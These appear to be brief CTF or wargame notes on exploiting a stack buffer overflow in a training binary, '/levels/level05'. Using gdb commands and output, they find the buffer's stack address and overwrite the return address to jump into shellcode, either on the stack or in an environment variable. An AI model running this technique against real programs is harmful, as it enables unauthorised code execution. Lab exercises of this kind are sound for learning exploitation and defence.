Jump within stack
~~~~~~~~~~~~~~~~~
::

  gdb /levels/level05


  (gdb) run $(python -c 'print "A" * 140')
  ...
  Program received signal SIGSEGV, Segmentation fault.
  0xb7ea9c00 in __libc_start_main () from /lib/i686/cmov/libc.so.6

  (gdb) info proc stat
  ...
  Start of text: 0x8048000
  End of text: 0x804852c
  Start of stack: 0xbffffcf0 < Want this address

  (gdb) find /4 0xbffffcf0, +300, 0x41414141
  0xbffffe0b
  0xbffffe0c
  0xbffffe0d
  0xbffffe0e
  4 patterns found

May need to adjust the length param, or use 0xbfffffff as end

Then construct overflow
/levels/level05 $(./shell.py 140 "\x0b\xfe\xff\xbf")

Jumping to env
~~~~~~~~~~~~~~
Easiest way if you have access
::

  $ export EGG=$(./shell.py 100)

  $ env_addr EGG
  EGG: 0xbffffb1b

  $ /levels/level05 $(./shell.py 140 "\x1b\xfb\xff\xbf")
